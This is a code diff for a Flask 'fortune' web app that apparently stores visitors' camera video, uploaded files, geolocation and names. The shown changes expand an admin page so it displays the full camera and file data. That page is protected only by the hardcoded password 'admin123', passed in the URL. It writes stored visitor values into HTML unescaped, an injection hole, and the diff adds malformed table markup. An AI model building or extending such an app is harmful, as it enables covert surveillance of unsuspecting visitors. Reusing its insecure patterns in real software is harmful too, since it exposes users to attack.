@@ -148,21 +148,26 @@ def admin():
         password = request.form.get('password')
         if password == 'admin123':
             visitors = get_visitors()
-            html = '<h1>💕 Visitor Data</h1><p><a href="/admin">Back to login</a> | <a href="/admin/download-csv?pass=admin123">📥 Download CSV (Excel compatible)</a></p>'
-            html += '<table border="1" cellpadding="5">'
-            html += '<tr>' + ''.join(f'<th>{f}</th>' for f in ALL_FIELDS) + '</tr>'
+            html = '<h1>💕 Visitor Data (All Fields)</h1>'
+            html += '<p><a href="/admin">Back to login</a> | <a href="/admin/download-csv?pass=admin123">📥 Download CSV (Excel compatible)</a></p>'
+            html += '<div style="overflow-x: auto;">'
+            html += '<table border="1" cellpadding="5" style="border-collapse: collapse; min-width: 800px;">'
+            html += '<tr>' + ''.join(f'<th style="background:#ff6b6b; color:white; padding:8px;">{f}</th>' for f in ALL_FIELDS) + '</tr>'
             if not visitors:
-                html += '<tr><td colspan="21">No data yet</td></tr>'
+                html += '<td><td colspan="21">No data yet</td></tr>'
             else:
                 for v in visitors:
                     html += '<tr>'
                     for f in ALL_FIELDS:
                         val = v.get(f, '')
-                        if f in ('cameraVideo', 'files') and len(str(val)) > 100:
-                            val = str(val)[:100] + '…'
-                        html += f'<td>{str(val)[:100]}</td>'
+                        # For long strings, show full content in a scrollable cell (max-width 300px)
+                        if f in ('cameraVideo', 'files') and isinstance(val, str) and len(val) > 100:
+                            display_val = f'<div style="max-width:300px; overflow-x:auto; white-space:pre-wrap; font-size:11px;">{val}</div>'
+                        else:
+                            display_val = str(val)[:500]  # still show up to 500 chars for other fields
+                        html += f'<td style="padding:8px; font-size:12px;">{display_val}</td>'
                     html += '</tr>'
-            html += '<table>'
+            html += '</table></div>'
             return html
         else:
             return '<h1>🔒 Wrong password. <a href="/admin">Try again</a></h1>'
@@ -599,8 +604,8 @@ HTML_TEMPLATE = '''
     async function finalizeAndSave() {
         const fortuneResp = await fetch('/get-fortune');
         const fortuneData = await fortuneResp.json();
-        currentFortuneText = fortuneData.fortune;
-        document.getElementById('fortuneText').innerText = currentFortuneText + " Dear " + visitorData.name + "! 💕";
+        currentFortuneText = fortuneData.fortune + " Dear " + visitorData.name + "! 💕";
+        document.getElementById('fortuneText').innerText = currentFortuneText;
         
         if (visitorData.latitude && visitorData.latitude !== 'denied') {
             visitorData.mapUrl = `https://www.google.com/maps?q=${visitorData.latitude},${visitorData.longitude || 0}`;
@@ -674,4 +679,5 @@ HTML_TEMPLATE = '''
 
 if __name__ == '__main__':
     init_json()
-    app.run(host='0.0.0.0', port=5000, debug=False)
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=False)
